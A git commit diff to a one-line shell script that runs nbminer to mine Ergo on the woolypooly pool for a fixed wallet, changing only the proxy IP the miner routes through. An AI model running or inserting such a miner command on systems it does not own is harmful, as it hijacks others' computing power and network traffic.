04eb22014f2324d1bbb0fee251c6dddf6e98dabc
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-07-08 11:03:21 +0200

    Update nb_woolWs2.sh

--- nb_woolWs2.sh
+++ nb_woolWs2.sh
@@ -1,1 +1,1 @@
-./nbminer -a ergo -o stratum+tcp://pool.us.woolypooly.com:3100 -u 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg.NB -log --proxy 13.58.156.16:9999
+./nbminer -a ergo -o stratum+tcp://pool.us.woolypooly.com:3100 -u 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg.NB -log --proxy 52.14.232.239:9999
